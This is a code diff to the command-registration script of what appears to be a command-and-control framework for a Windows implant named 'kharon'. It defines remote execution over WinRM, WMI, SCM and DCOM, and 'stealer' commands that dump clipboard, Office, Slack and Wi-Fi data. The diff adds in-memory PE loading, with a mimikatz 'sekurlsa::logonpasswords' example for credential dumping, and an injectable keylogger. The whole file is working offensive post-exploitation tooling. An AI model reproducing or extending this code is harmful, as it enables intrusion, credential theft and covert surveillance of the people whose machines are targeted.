@@ -1,4 +1,4 @@
-// REMOTE EXEC
+﻿// REMOTE EXEC
 
 let cmd_rmt_exec_winrm = ax.create_command("winrm", "Execute command on remote machine using WinRM protocol", "remote-exec winrm -t 192.168.1.10 -c \"whoami\" -u admin -p pass", "Task: remote execution via WinRM");
 cmd_rmt_exec_winrm.addArgFlagString("-t", "target", "Computer name or IP address", true);
@@ -83,6 +83,25 @@ cmd_rmt_exec_dcom.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
 let cmd_rmt_exec = ax.create_command("remote-exec", "Execute commands on remote machines via WMI, WinRM, SCM, or DCOM");
 cmd_rmt_exec.addSubCommands([cmd_rmt_exec_winrm, cmd_rmt_exec_wmi, cmd_rmt_exec_scm, cmd_rmt_exec_dcom]);
 
+// PE REFLECTION
+
+let cmd_reflect = ax.create_command("reflect", "Execute PE in memory", "reflect -f /tmp/mimikatz.exe -a \"sekurlsa::logonpasswords\" \"exit\" ", "Task: execute PE inline");
+cmd_reflect.addArgFlagFile("-f", "pe_file", true, "PE file");
+cmd_reflect.addArgFlagString("-a", "args", false, "PE arguments");
+cmd_reflect.addArgFlagString("-e", "expfunc", false, "Exported function to execute (default: DllMain)");
+cmd_reflect.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let pe_file = parsed_json["pe_file"];
+    let args = parsed_json["args"] || "";
+    let expfunc = parsed_json["expfunc"] || "DllMain";
+    
+    let mod_params = ax.bof_pack("bytes,cstr,cstr", [pe_file, args, expfunc]);
+    let mod_path = ax.script_dir() + "Shellcode/Reflection/Bin/pe_reflection." + ax.arch(id) + ".bin";
+    let message = `Task: executing PE in-memory`;
+
+    ax.execute_alias(id, cmdline, `execute postex -m inline -f ${mod_path} -a ${mod_params}`, message);
+});
+
+
 // DOTNET
 
 let cmd_dotnet_list_v = ax.create_command("listversions", "Enumerate installed .NET Framework versions using BOF", "dotnet listversions", "Task: enumerate .NET versions");
@@ -140,7 +159,6 @@ cmd_dotnet_fork.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
 let cmd_dotnet = ax.create_command("dotnet", ".NET Framework operations - execute assemblies and enumerate versions");
 cmd_dotnet.addSubCommands([cmd_dotnet_list_v, cmd_dotnet_inline, cmd_dotnet_fork]);
 
-
 // STEALER
 
 let cmd_stealer_screenshot = ax.create_command("screenshot", "Capture a screenshot of the current desktop", "stealer screenshot", "Task: capture desktop screenshot");
@@ -195,13 +213,31 @@ cmd_stealer_wifi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });    
 
+let cmd_stealer_keylogger = ax.create_command("keylogger", "Execute Keylogger in-process spawning or injecting in the existence process", "stealer keylogger", "Task: execute Keylogger");
+cmd_stealer_keylogger.addArgFlagString("-m", "fork_method", false, "Method to use fork, choice 'explicit' need use fork_pid or 'spawn'");
+cmd_stealer_keylogger.addArgFlagInt("-P", "fork_pid", false, "Pid to use for inject in the explicit method");
+cmd_stealer_keylogger.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let fork_method = parsed_json["fork_method"];
+    let fork_pid = parsed_json["fork_pid"];
+
+    let keepload = 0;
+
+    let mod_params = ax.bof_pack("int", [keepload]);
+    let mod_path = ax.script_dir() + "Shellcode/Keylogger/Bin/keylogger_assembly." + ax.arch(id) + ".bin";
+    let message = `Task: executing Keylogger in-memory`;
+
+    ax.execute_alias(id, cmdline, `execute postex -m fork -t ${fork_method} -p ${fork_pid} -f ${mod_path} -a ${mod_params}`, message);
+});
+
 let cmd_stealer = ax.create_command("stealer", "Information gathering and credential extraction operations");
-cmd_stealer.addSubCommands([cmd_stealer_clipdump, cmd_stealer_screenshot, cmd_stealer_officedump, cmd_stealer_slackdump, cmd_stealer_wifi]);
+cmd_stealer.addSubCommands([cmd_stealer_clipdump, cmd_stealer_screenshot, cmd_stealer_officedump, cmd_stealer_slackdump, cmd_stealer_wifi, cmd_stealer_keylogger]);
 
 var group_stealer  = ax.create_commands_group("Stealer Commands", [cmd_stealer]);
 var group_dotnet   = ax.create_commands_group("Dotnet Interactions", [cmd_dotnet]);
 var group_rmt_exec = ax.create_commands_group("Remote Execution", [cmd_rmt_exec]);
+var group_extensions = ax.create_commands_group("Extensions", [cmd_reflect]);
 
 ax.register_commands_group(group_stealer , ["kharon"], ["windows"], []);
 ax.register_commands_group(group_dotnet  , ["kharon"], ["windows"], []);
 ax.register_commands_group(group_rmt_exec, ["kharon"], ["windows"], []);
+ax.register_commands_group(group_extensions, ["kharon"], ["windows"], []);
